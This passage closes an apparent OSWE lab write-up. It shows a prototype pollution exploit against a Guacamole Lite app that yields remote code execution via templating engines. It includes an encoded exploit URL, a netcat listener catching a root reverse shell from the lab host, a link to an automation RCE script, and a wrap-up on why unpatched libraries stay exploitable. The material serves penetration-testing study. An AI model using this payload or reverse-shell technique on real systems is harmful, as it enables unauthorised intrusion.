http://chips/rdp?token=eyJpdiI6InVDYUQ4UU81TDRWWFI1cVdWaGtjeVE9PSIsInZhbHVlIjoiQjNzRnJYZzdRSzBWWkowSm1lL3JRMHJ3eXYzNFRtMEZmQTErTStqQlgycWVMcFBUeVpoRkpOSmxoK3ZSdjF4K0YwYSt5Ynp5NEQxYkZ5cERhT0Y5bXdEMW5TZVB0UjlRS3F5Y1RYSlBueDdTMWRwVC9wZmJEVlNBYUN5VS8rOUUvMExyeFRWdG4zZG94cW9nTzZ2YUxjK1R5OVdBUnIzbGljR2g3YkhIWGJRS21veVZpU1FaWUhyVm5TZ0dHL3I2dTZibnNhVTU4aXZvWjZ6SjBOZVRBK0I5bkZtT3lhU2RIUGJoMmUram5hRlpNTzZZbXhlKzRuUm1lQThodG9zaktheVJGUXRueWt1blZJWERLbW95MjZPcHcwV0d5aEhTbFhOWWpacUNKWVdMZlJLblZ4WGxTY0o4SE1nTUg4K3pYa0d3MjJhdFE2WlhXR0hjdFJLYm55TDdwZEZOMmoxNE1PMzNDd05lamgzRnJWUnRWVHNlNE0zNStMTWhTOVFTK1J5bGg0TXZTWThnU3NOZE5WQ1QzZy92TDBxSmE5K1JhWkZycmhmWEhEM2JsbE9NTnB0ZXRRb1ZoMTR6RFc0TFJUaG5ITnovcVR4QjhBdTZFQzFnalcrU29jQTBCQ21tMU5sV0tNRHU1Q1VhZFdmMlRGbDdzd3VDQTRXZVhVMWFQNE1NdG9pb1JQWjQzRXlSbnVkUlFOOVcwSkR2UmhxVlRuak1iajVwV1k3WllaZG1aM0hBQlBCSk9KR0lFcU5wY005OTRJN3JwQVdqSkFma3JpVUpRajFNVVpmbGVFVGlUQWJodHg0T3RkVFFVQ3cxOGF4cmUwUnR2UWhLNFdKcyJ9
```
***Note:** You might need to send the request multiple times or send a request to `http://chips/rdp?token=` with empty token*

Check your listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.210] from (UNKNOWN) [192.168.156.138] 39802
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7f5568c19094:/usr/src/app#
```
**Automation script:** [hbs_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Guacamole%20Lite/hbs_rce.py)

## Wrapping Up
In this module, we introduced JavaScript prototypes, discussed how to pollute them, and how prototype pollution can be exploited. We discovered a prototype pollution vulnerability in a third-party library and exploited it. Finally, we used the prototype pollution vulnerability to exploit two different templating engines. We obtained confirmation of which templating engine the remote server was running and obtained remote code execution from both templating engines.

Prototype pollution is a vulnerability that is fairly common in third-party libraries. While many of these vulnerabilities have been fixed, many applications and libraries have not been updated to use the latest version. This leaves us with a prime opportunity to exploit the vulnerability and obtain code execution.
